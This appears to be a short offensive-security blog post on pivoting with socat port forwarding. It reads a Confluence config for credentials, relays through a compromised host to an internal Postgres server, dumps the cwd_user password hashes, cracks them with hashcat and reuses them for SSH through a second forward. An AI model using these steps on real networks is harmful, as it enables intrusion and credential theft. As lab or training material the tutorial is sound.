---
layout: post
title: Port Forwarding Socat
titledate: 09/22/23
tags: ["infosec", "info_gathering", "offsec", "tunnel", "socat", "hashcat"]
---

#### port forwarding

upon inspecting a machine we have gained access to we discover a confluence config

    $ cat /var/atlassian/application-data/confluence/confluence.cfg.xml

this machine has creds for a machine we do not have access to but our target doe and is running a postgres server

first we need to copy or install socat on our target machine inside our WAN

we will use socat to set up a listening port on the target machine we have access to in our WAN

    target@reachable:/ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.1.1:5432

because we have connected to our target and run ip to identify another machine (10.4.1.1) running postgres (5432) that it can talk to (DMZ) but we cannot, we will execute the command above 

this tells socat that it will listen on the target machine on port 2345 and forward any received connections to port 5432 as a new process

now on our attacking machine we attempt a psql login as postgres to the target

    $ psql -h 192.168.1.1 -p 2345 -U postgres

and it gets forwarded to the DMZ machine running postgres

    postgres=# \l

list available databases

    postgres=# \c confluence

connect to confluence database

    postgres=# \dt

display tables in the database

    postgres=# select * from cwd_user;

display all contents of the cwd_user table

this table contains all of the users and passwords for confluence

we can store the hashes in a txt file to crack with hashcat on our kali machine
    
    $ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt

12001 is the hashcat mode for confluence

#### leveraging cracked passwords

if we discover a password from the above confluence database, we can try to see if there are any other services running on that server like ssh

if so, we can do the same setup as before but bind our socat to a different port

    target@reachable:/ socat TCP-LISTEN:2222,fork TCP:10.1.1.215:22

here because the target machine we can reach inside our WAN isn't running anything on port 2222 we bind that listening port and forward incoming connections to our DMZ system that is running postgres and ssh on port 22

    $ ssh database_admin@192.168.50.63 -p2222

on our linux machine we can attempt to utilize the credentials we discovered in the confluence table hack to see if we are able to ssh into the DMZ system running ssh, we provide port 2222 because that is what is listening on the confluence machine

### other port forwarding options, rinetd, netcat and FIFO named pipe file, iptables with root privs
